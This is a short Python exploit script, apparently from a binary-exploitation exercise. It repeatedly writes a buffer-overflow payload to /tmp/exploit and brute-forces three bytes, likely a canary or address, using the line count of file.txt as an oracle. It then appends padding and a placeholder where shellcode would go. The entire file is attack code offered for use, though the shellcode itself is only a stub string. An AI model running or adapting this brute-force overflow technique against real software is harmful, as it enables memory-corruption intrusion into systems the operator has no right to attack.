#! /usr/bin/python3
import os.path
import time
import struct
from os import path
import sys
def main():
    payload=b'A'*40 +b'\x00'
    offset=0
    for i in range(3):
        print("Guessing byte ",i+1)
        for c1 in range(256):
            while path.exists("/tmp/exploit"):
                time.sleep(0.5)
            f = open('/tmp/exploit', 'wb')
            f.write(payload+struct.pack("B", c1))
            f.close()
            time.sleep(0.5)
            f2=open('./file.txt','r')
            lines = f2.readlines()
            num_lines = len(lines)
            print(num_lines-offset,c1)
            if(num_lines-offset==c1):
                offset+=c1
                payload+=struct.pack("B", c1)
                print("found something")
                break

    print(payload)
    f = open('/tmp/exploit', 'wb')
    f.write(payload + b'A'*12 + b'shellcode')
    f.close()

                
if __name__== "__main__":
    main()